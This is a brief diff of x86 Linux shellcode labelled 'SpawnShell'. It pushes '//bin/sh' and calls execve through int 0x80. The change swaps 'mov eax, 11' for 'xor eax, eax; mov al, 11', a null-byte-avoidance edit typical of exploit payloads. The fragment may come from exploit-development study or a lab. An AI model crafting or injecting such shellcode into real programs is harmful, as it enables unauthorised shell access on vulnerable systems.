@@ -162,6 +162,7 @@ SpawnShell:
     push 0x68732f6e
     push 0x69622f2f
     mov ebx, esp
-    mov eax, 11
+    xor eax, eax
+    mov al, 11
 
     int 0x80
